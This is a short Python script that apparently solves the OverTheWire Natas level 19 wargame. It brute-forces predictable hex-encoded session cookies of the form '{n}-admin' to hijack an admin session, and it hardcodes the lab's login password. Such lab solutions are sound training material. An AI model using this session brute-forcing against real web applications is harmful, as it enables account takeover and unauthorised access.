from binascii import hexlify

import requests
from requests.auth import HTTPBasicAuth

HOST = 'http://natas19.natas.labs.overthewire.org/index.php?debug=1'
auth = HTTPBasicAuth('natas19', '4IwIrekcuZlA9OsjOkoUtwU6lhokCPYs')

for i in range(1000):
    cookies = dict(PHPSESSID=hexlify('{0}-admin'.format(str(i))))
    r = requests.post(HOST, cookies=cookies, auth=auth)
    if 'Username: natas' in r.content:
        print r.content

